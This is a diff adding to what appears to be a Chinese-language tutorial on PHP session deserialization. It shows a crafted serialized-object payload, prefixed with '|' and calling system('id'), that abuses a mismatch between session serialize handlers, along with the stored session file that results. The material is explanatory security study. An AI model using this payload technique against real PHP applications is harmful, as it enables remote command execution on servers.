@@ -95,3 +95,22 @@ class D{
 O:1:"D":1:{s:1:"a";s:13:"system('id');";}
 ```
 在接收sess的页面提交
+
+此时，会以序列化数组的形式存储
+为了能在php格式读取到序列化字符串，因此提交的时候要对应php_session的格式，在前面加上|
+
+```php
+|O:1:"D":1:{s:1:"a";s:13:"system('id');";}
+```
+
+下面是提交后的sess
+```php
+root@44b7f2c349ec:/var/www/html/tmp# cat sess_cntr30saf7dgo4nrkf25b6rcb4
+
+a:1:{s:3:"ben";s:42:"|O:1:"D":1:{s:1:"a";s:13:"system('id');";}";}
+```
+可以看到`a:1:{s:3:"ben";s:42:"`和`O:1:"D":1:{s:1:"a";s:13:"system('id');";}`
+最后的`":}`也就被注释了
+被`|`分割，当php格式读取的时候，键值就是后者，刚好就是序列化字符串，然后进行反序列化执行漏洞
+
+![](assets/session介绍/file-20260204161302013.png)
